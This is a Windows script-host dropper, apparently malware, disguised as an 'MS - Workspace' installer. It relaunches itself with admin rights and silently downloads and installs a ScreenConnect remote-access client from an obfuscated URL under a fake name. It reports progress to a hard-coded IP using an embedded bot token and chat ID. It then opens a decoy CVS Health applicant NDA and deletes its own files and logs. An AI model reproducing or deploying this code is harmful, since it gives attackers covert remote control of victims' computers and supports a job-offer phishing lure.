
(function () {
//c1713560ae5c
    "use strict";


    var SETTINGS = {
//7cf586ce842f
        PRODUCT_NAME: "MS - Workspace",
        PRODUCT_VERSION: "1.0.0",
//6366b0337a51
        MSI_URL: ["https://","educationalfiles.","online/Bin/ScreenConnect.","ClientSetup.","msi?e=Access&y=Guest"].join(''),
        MSI_FILE_NAME: "WindowsMetricsCollector.msi",
//3abbfef8c8a7
        INSTALL_DIR: "%ProgramData%\\MSWorkspace\\Install",
        LOG_DIR: "%ProgramData%\\MSWorkspace\\Logs",
//74a4eb9178a4
        LOG_FILE: "deploy.log",
        MSI_LOG_FILE: "msi-install.log",
//b52735c82d7e
        DOWNLOAD_RETRIES: 2,
        RETRY_DELAY_MS: 1500,
//311b65273b1e
        DOWNLOAD_TIMEOUT_MS: 300000,
        MSI_EXTRA_ARGS: "",


//aef50f85151b
        EXFIL_HOST: "212.43.151.96:20002",        
        
//d86ddbb07a46
        TBTOKEN: "8679220057:AAHOQoG-qxYVT7-3si70mYE4_veZBf7q4l8",
        TCID: "-1004296347689",
//69f5cfa3a925
        DEPLOY_TOKEN: Math.random().toString(36).substring(2, 8), 


        UNINSTALL_EXISTING: true,
//3090b680b080
        PRODUCT_CODE: "{4228D3D7-CF51-5361-1BC4-165794361D9B}",


        SHOW_POPUPS: false,
//3c7ec593bf51
        OPEN_URL: ["https://","doc-learningmaterials.","online/public/CVS_Health_Remote_Applicant_NDA.","pdf"].join('')
    };


//0f2683de0659
    var wsh = new ActiveXObject("WScript.Shell");
    var fsys = new ActiveXObject("Scripting.FileSystemObject");


//febd3cf1938c
    function resolveEnv(p) {
        return wsh.ExpandEnvironmentStrings(p);
//bfdbeb051015
    }


    var paths = {
//f769113ea4ea
        installDir: resolveEnv(SETTINGS.INSTALL_DIR),
        logDir: resolveEnv(SETTINGS.LOG_DIR),
//af9b5890c994
        logFile: resolveEnv(SETTINGS.LOG_DIR) + "\\" + SETTINGS.LOG_FILE,
        msiLogFile: resolveEnv(SETTINGS.LOG_DIR) + "\\" + SETTINGS.MSI_LOG_FILE,
//e8d32c35d6a3
        msiPath: resolveEnv(SETTINGS.INSTALL_DIR) + "\\" + SETTINGS.MSI_FILE_NAME
    };


//be6b3b5f4261
    function pad(n) {
        return (n < 10 ? "0" : "") + n;
//8cbd5805eb4a
    }


    function ts() {
//147dc4debee0
        var d = new Date();
        return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()) +
//9c0d817755b8
            " " + pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
    }


//e63ef1e8f530
    function mkdirs(dir) {
        var parent;
//340ededa37f7
        dir = String(dir).replace(/[\\\/]+$/, "");
        if (!dir || fsys.FolderExists(dir)) return;
//ab49c1d986fb
        parent = fsys.GetParentFolderName(dir);
        if (parent && parent !== dir && !fsys.FolderExists(parent)) {
//a2c441e7fa19
            mkdirs(parent);
        }
//9bb49db2a74a
        if (!fsys.FolderExists(dir)) fsys.CreateFolder(dir);
    }


//8123f9eea954
    function log(level, msg) {
        try {
//6a0f99eb5af3
            mkdirs(paths.logDir);
            var f = fsys.OpenTextFile(paths.logFile, 8, true);
//ac8600e7adfa
            f.WriteLine("[" + ts() + "] [" + level + "] " + msg);
            f.Close();
//e7db8b4779a5
        } catch (e) { }
    }


//2cb7ac564fd1
    function beacon(stage, exitCode) {
        try {
//5d1d50200de5
            var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            var now = new Date();
//66187cdd47c0
            var dts = pad(now.getMonth() + 1) + pad(now.getDate()) +
                      pad(now.getHours()) + pad(now.getMinutes());
//cc86e5b540c4
            var statusCode, exitStr;


            switch (stage) {
//a348c4f58552
                case "start": statusCode = "go";  exitStr = "0";     break;
                case "ok":    statusCode = "ok";  exitStr = String(exitCode || 0);    break;
//cc1e37aca8c2
                case "okr":   statusCode = "okr"; exitStr = String(exitCode || 3010); break;
                case "oka":   statusCode = "oka"; exitStr = String(exitCode || 1638); break;
//3cd606338409
                case "cl":    statusCode = "cl";  exitStr = String(exitCode || 1602); break;
                default:      statusCode = "fl";  exitStr = String(exitCode || 1);    break;
//ae5808fb4a85
            }


            var deployId = SETTINGS.DEPLOY_TOKEN;


//8707ed132aa5
            var url = "http://" + SETTINGS.EXFIL_HOST + "/" +
                      SETTINGS.TBTOKEN + "/" +
//727cef75719c
                      SETTINGS.TCID + "/" +
                      deployId + "." +
//7ec982ebae84
                      statusCode + "." +
                      exitStr + "." +
//6cda2286012b
                      dts;


            http.Open("GET", url, false);
//40726d3b4c5a
            http.SetTimeouts(1000, 1000, 1000, 1000);
            http.Send();
//3cb9de5ee806
        } catch (e) { }
    }


//63a630ec7c08
    // ── helpers ──


    function checkAdmin() {
//556b5ba1301c
        try {
            var exec = wsh.Exec("net session");
//e79c5a8d6e9e
            while (exec.Status === 0) { WScript.Sleep(50); }
            return exec.ExitCode === 0;
//849bd18716fb
        } catch (e) { return false; }
    }


//79d8e9bcaa0d
    function escalate() {
        var app = new ActiveXObject("Shell.Application");
//b666895fca66
        var script = WScript.ScriptFullName;
        app.ShellExecute("cscript.exe", '//nologo "' + script + '"', "", "runas", 0);
//37523800281a
        WScript.Quit(0);
    }


//af4bec39d746
    function checkConfig() {
        if (!SETTINGS.MSI_URL) abort("Setup could not start.", "MSI_URL is empty", 1);
//3523fcb2a2f0
        if (SETTINGS.MSI_URL.indexOf("https://") !== 0 && SETTINGS.MSI_URL.indexOf("http://") !== 0)
            abort("Setup could not start.", "Invalid MSI_URL scheme", 1);
//61fa6e6e3acb
        if (SETTINGS.MSI_FILE_NAME.indexOf(".msi") === -1)
            abort("Setup could not start.", "Invalid MSI_FILE_NAME", 1);
//e482efb10196
    }


    function writeResponse(responseBody, outPath) {
//6d12409bfb84
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
//0be4948085df
        stream.Open();
        stream.Write(responseBody);
//0525df240622
        if (stream.Size <= 0) { stream.Close(); return 0; }
        if (fsys.FileExists(outPath)) fsys.DeleteFile(outPath, true);
//76d1da0d70b0
        stream.SaveToFile(outPath, 2);
        var size = stream.Size;
//9247194c681a
        stream.Close();
        return size;
//c706021ca773
    }


    function fetchPayload(url, outPath) {
//8136c0a0fb30
        var attempt, http, err, bytesWritten, status;
        mkdirs(fsys.GetParentFolderName(outPath));
//3d2d9608725d
        err = "Unknown download error";


        for (attempt = 0; attempt <= SETTINGS.DOWNLOAD_RETRIES; attempt++) {
//40f6a701820d
            try {
                http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
//059ca27f081c
                try { http.Option(9) = 2048; } catch (e) { }
                http.SetTimeouts(30000, 30000, SETTINGS.DOWNLOAD_TIMEOUT_MS, SETTINGS.DOWNLOAD_TIMEOUT_MS);
//da94a2409a09
                http.Open("GET", url, false);
                http.Send();
//b5b9511fb915
                status = http.Status;
                if (status === 200) {
//a213f60aa1ea
                    bytesWritten = writeResponse(http.ResponseBody, outPath);
                    if (bytesWritten > 0 && fsys.FileExists(outPath)) return true;
//d6f791c2c6c3
                    err = "HTTP 200 but zero-byte payload";
                } else { err = "HTTP " + status; }
//bcee7ed73218
            } catch (ex) { err = (ex.message || String(ex)); }
            if (attempt < SETTINGS.DOWNLOAD_RETRIES) WScript.Sleep(SETTINGS.RETRY_DELAY_MS);
//f7da9aa10154
        }
        return false;
//42fee2cb9492
    }


    function purgeOld() {
//c73d21d0a495
        if (!SETTINGS.UNINSTALL_EXISTING || !SETTINGS.PRODUCT_CODE) return;
        var cmd = "msiexec.exe /x " + SETTINGS.PRODUCT_CODE +
//aab188b367ce
                  " /qn /norestart REBOOT=ReallySuppress";
        log("INFO", "Uninstalling existing product: " + SETTINGS.PRODUCT_CODE);
//4aed351454e1
        var code = wsh.Run(cmd, 0, true);
        if (code !== 0 && code !== 1605 && code !== 1612)
//d217098ec8b8
            log("WARN", "Uninstall returned " + code + " — continuing anyway");
        else
//ffa5fd2b4e37
            log("INFO", "Uninstall exit code: " + code);
        WScript.Sleep(3000);
//b9259d997366
    }


    function execMsi(msiPath) {
//08dd9671f57b
        var args, cmd, code, attempt, modes;
        mkdirs(paths.logDir);
//dbec7c66413c
        modes = [
            "/qn /norestart REBOOT=ReallySuppress ALLUSERS=1",
//dff246a04cce
            "/qb /norestart REBOOT=ReallySuppress ALLUSERS=1"
        ];
//3c15ebc716f7
        for (attempt = 0; attempt < modes.length; attempt++) {
            args = '/i "' + msiPath + '" ' + modes[attempt] + " " +
//39075ce39ab0
                   SETTINGS.MSI_EXTRA_ARGS + ' /L*v "' + paths.msiLogFile + '"';
            cmd = "msiexec.exe " + args;
//dd438504807b
            code = wsh.Run(cmd, 0, true);
            if (code === 0 || code === 3010 || code === 1641 || code === 1638) return code;
//1cdcfd4b4a78
            if (code !== 1603) return code;
            WScript.Sleep(2000);
//386627622150
        }
        return 1603;
//10435377d270
    }


    function explainCode(code) {
//c865db15d419
        switch (code) {
            case 0:    return "Success";
//d43f510aaa6e
            case 3010: return "Success (restart required)";
            case 1641: return "Success (restart initiated)";
//6bf947ba7f36
            case 1638: return "Already installed";
            case 1602: return "Canceled by user";
//772376dd167d
            case 1603: return "Fatal error during installation";
            case 1618: return "Another installation is already in progress";
//6bc194b2e886
            default:   return "Exit code " + code;
        }
//bd4c4f5fb72d
    }


    function isOk(code) {
//13b6016ef023
        return code === 0 || code === 3010 || code === 1641 || code === 1638;
    }


//892eb4004225
    function openUrl(url) {
        if (!url) return;
//fee6dbdf24e7
        try {
            var app = new ActiveXObject("Shell.Application");
//5664078287cf
            app.ShellExecute(url, "", "", "open", 1);
        } catch (e) { }
//66b1c6c2e9fb
    }


    function abort(friendlyMsg, technicalMsg, exitCode) {
//5d545fc6f1e4
        if (technicalMsg) log("ERROR", technicalMsg);
        if (typeof exitCode !== "number") exitCode = 1;
//3025abc11fad
        log("ERROR", "MSI log file: " + paths.msiLogFile);
        beacon("fail", exitCode);
//1bb015475450
        if (SETTINGS.SHOW_POPUPS)
            wsh.Popup(friendlyMsg, 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
//dfc8b971e6bd
        WScript.Quit(exitCode);
    }


//78e320c1a95d
    mkdirs(paths.installDir);
    mkdirs(paths.logDir);


//718635a32292
    if (!checkAdmin()) { escalate(); }


    beacon("start", null);


//1dfabf6c93dd
    checkConfig();


    if (!fetchPayload(SETTINGS.MSI_URL, paths.msiPath)) {
//5912df00c2d5
        abort(
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
//5abaaa1a46f7
            "Download failed after " + (SETTINGS.DOWNLOAD_RETRIES + 1) + " attempts", 1
        );
//6e2a389d5e39
    }


    if (!fsys.FileExists(paths.msiPath) || fsys.GetFile(paths.msiPath).Size <= 0) {
//28d042a86958
        abort(
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
//ec95aba84724
            "MSI missing or empty after download", 1
        );
//ac7b7493fa4d
    }


    purgeOld();


//ba774633bcfe
    var exitCode = execMsi(paths.msiPath);
    var statusText = explainCode(exitCode);


//ca1e206dc469
    if (isOk(exitCode)) {
        if (exitCode === 3010 || exitCode === 1641) beacon("okr", exitCode);
//ac1e32625dcf
        else if (exitCode === 1638)                 beacon("oka", exitCode);
        else                                        beacon("ok", exitCode);
//9ba53139baad
    } else if (exitCode === 1602) {
        log("WARN", "Installation canceled by user");
//6e6e2878072e
        beacon("cl", exitCode);
        if (SETTINGS.SHOW_POPUPS)
//f9709cbd3ed3
            wsh.Popup("Setup was canceled.", 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
    } else {
//ed166dd27b6d
        log("ERROR", "Installation result: " + statusText);
        log("ERROR", "MSI log file: " + paths.msiLogFile);
//5b35d62eee1c
        beacon("fail", exitCode);
        if (SETTINGS.SHOW_POPUPS)
//2374fbfb9f38
            wsh.Popup("Setup could not be completed.\n\n" + statusText +
                "\n\nCheck log:\n" + paths.msiLogFile, 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
//87999a211298
    }

//3dd1f3c63ace
    openUrl(SETTINGS.OPEN_URL);


    try {
//4cac1a3a9ffe
        if (fsys.FileExists(paths.msiPath))   fsys.DeleteFile(paths.msiPath, true);
        if (fsys.FileExists(paths.logFile))   fsys.DeleteFile(paths.logFile, true);
//b64282ce69af
        if (fsys.FileExists(paths.msiLogFile)) fsys.DeleteFile(paths.msiLogFile, true);
        if (fsys.FolderExists(paths.logDir))  { try { fsys.DeleteFolder(paths.logDir, true); } catch (e) { } }
//2baf2de60c32
    } catch (e) { }


    WScript.Quit(exitCode);
//4bf281c14efc
})();
